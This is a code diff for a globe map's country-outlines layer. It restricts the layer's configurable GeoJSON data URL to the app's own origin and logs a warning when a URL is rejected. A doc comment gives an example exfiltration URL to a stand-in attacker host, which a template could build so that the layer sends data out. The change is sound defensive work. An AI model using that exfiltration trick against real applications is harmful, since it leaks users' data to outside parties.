@@ -13,8 +13,29 @@ export interface CountryOutlinesOptions {
   /**
    * GeoJSON URL for country boundaries. Defaults to Natural Earth 50m, served by the app itself (see
    * `assets/README.md`), or to the same release on GitHub in a host that does not serve it.
+   *
+   * Only a URL on the app's own origin is fetched — see {@link permittedDataUrl}.
    */
   dataUrl?: string;
+}
+
+/**
+ * A `dataUrl` if it may be fetched, or undefined to fall back to the default.
+ *
+ * Layer options come from the template, and this layer `fetch`es whatever the option says. A template
+ * could build `https://attacker.example/?data=…` out of what it reads and have the layer send it —
+ * and the Content-Security-Policy cannot stop that, because `connect-src` has to allow any https
+ * host: the node's address is chosen at runtime. So the rule is here instead: the app's own origin
+ * only, which is where every WE app serves the boundaries anyway. A deployment wanting other borders
+ * serves them itself.
+ */
+export function permittedDataUrl(url: string | undefined, pageOrigin: string): string | undefined {
+  if (!url) return undefined;
+  try {
+    return new URL(url, pageOrigin).origin === new URL(pageOrigin).origin ? url : undefined;
+  } catch {
+    return undefined;
+  }
 }
 
 /**
@@ -53,12 +74,14 @@ export const countryOutlinesLayer: LayerFactory<CountryOutlinesOptions> = (optio
   onMount: async (context: LayerContext) => {
     const { viewer, events, onCleanup } = context;
     const served = import.meta.env.WE_GLOBE_LAYER_ASSETS_URL;
-    const {
-      color = '#ffffff',
-      opacity = 0.5,
-      width = 2,
-      dataUrl = served ? `${served}country-outlines.geojson` : COUNTRY_OUTLINES_URL,
-    } = options || {};
+    const { color = '#ffffff', opacity = 0.5, width = 2 } = options || {};
+    const requested = permittedDataUrl(options?.dataUrl, window.location.href);
+    if (options?.dataUrl && !requested) {
+      console.warn(
+        `[country-outlines] dataUrl ${options.dataUrl} is not on this app's origin, so the default is used.`,
+      );
+    }
+    const dataUrl = requested ?? (served ? `${served}country-outlines.geojson` : COUNTRY_OUTLINES_URL);
 
     const entities: string[] = [];
     let cancelled = false;
